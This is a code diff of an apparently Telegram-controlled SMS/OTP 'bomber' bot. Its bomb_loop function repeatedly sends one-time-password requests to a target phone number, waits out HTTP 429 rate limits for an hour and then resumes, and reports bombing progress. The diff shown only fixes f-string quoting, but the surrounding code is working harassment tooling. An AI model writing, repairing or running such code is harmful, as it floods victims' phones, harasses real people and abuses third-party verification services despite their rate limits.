@@ -285,7 +285,7 @@ async def bomb_loop(
     connector = aiohttp.TCPConnector(limit=10)  # limit simultaneous connections
     async with aiohttp.ClientSession(connector=connector) as session:
         last_update = 0
-        while not stop_event.is_set() and stats["sent"] < total_count:
+        while not stop_event.is_set() and stats['sent'] < total_count:
             # Pause handling (Rate Limit 429)
             if stats["paused_until"]:
                 if datetime.now() < stats["paused_until"]:
@@ -296,8 +296,8 @@ async def bomb_loop(
                             f"🔄 Rate Limit – Paused\n"
                             f"📱 Target: `{phone}`\n"
                             f"⏱ Interval: {interval}s\n"
-                            f"📊 Progress: {stats["sent"]}/{total_count}\n"
-                            f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}\n"
+                            f"📊 Progress: {stats['sent']}/{total_count}\n"
+                            f"✅ Success: {stats['success']}  ❌ Fail: {stats['fail']}\n"
                             f"⏰ Resume in {remaining//60:02d}:{remaining%60:02d}"
                         )
                         try:
@@ -310,39 +310,39 @@ async def bomb_loop(
                     stats["paused_until"] = None # Resume
 
             success, code, detail = await send_otp_with_retry(session, phone)
-            stats["sent"] += 1
+            stats['sent'] += 1
 
             if success:
-                stats["success"] += 1
+                stats['success'] += 1
             else:
-                stats["fail"] += 1
+                stats['fail'] += 1
                 if code == 429: # Rate limit, pause for 1 hour
                     stats["paused_until"] = datetime.now() + timedelta(hours=1)
                     logger.warning(f"Rate limit hit for {phone}. Pausing for 1 hour.")
 
-            if time.time() - last_update >= 5 or stats["sent"] == total_count:
+            if time.time() - last_update >= 5 or stats['sent'] == total_count:
                 last_update = time.time()
                 text = (
                     f"💣 Bombing Status\n"
                     f"📱 Target: `{phone}`\n"
                     f"⏱ Interval: {interval}s\n"
-                    f"📊 Progress: {stats["sent"]}/{total_count}\n"
-                    f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}"
+                    f"📊 Progress: {stats['sent']}/{total_count}\n"
+                    f"✅ Success: {stats['success']}  ❌ Fail: {stats['fail']}"
                 )
                 try:
                     await status_msg.edit_text(text, parse_mode="Markdown")
                 except Exception as e:
                     logger.error(f"Error editing status message: {e}")
 
-            if stats["sent"] < total_count:
+            if stats['sent'] < total_count:
                 await asyncio.sleep(interval)
 
-    stats["status"] = "Completed" if stats["sent"] >= total_count else "Stopped"
+    stats['status'] = "Completed" if stats['sent'] >= total_count else "Stopped"
     final_text = (
         f"✅ Bombing Finished!\n"
         f"📱 Target: `{phone}`\n"
-        f"📊 Total Sent: {stats["sent"]}\n"
-        f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}"
+        f"📊 Total Sent: {stats['sent']}\n"
+        f"✅ Success: {stats['success']}  ❌ Fail: {stats['fail']}"
     )
     try:
         await status_msg.edit_text(final_text, parse_mode="Markdown")
@@ -437,11 +437,11 @@ async def show_status_handler(message: Message) -> None:
         stats = bomb_stats[user_id]
         text = (
             f"💣 Current Bombing Status\n"
-            f"📱 Target: `{stats["phone"]}`\n"
-            f"⏱ Interval: {stats["interval"]}s\n"
-            f"📊 Progress: {stats["sent"]}/{stats["total"]}\n"
-            f"✅ Success: {stats["success"]}  ❌ Fail: {stats["fail"]}\n"
-            f"Status: {stats["status"]}"
+            f"📱 Target: `{stats['phone']}`\n"
+            f"⏱ Interval: {stats['interval']}s\n"
+            f"📊 Progress: {stats['sent']}/{stats['total']}\n"
+            f"✅ Success: {stats['success']}  ❌ Fail: {stats['fail']}\n"
+            f"Status: {stats['status']}"
         )
         if stats["paused_until"]:
             remaining = (stats["paused_until"] - datetime.now()).seconds
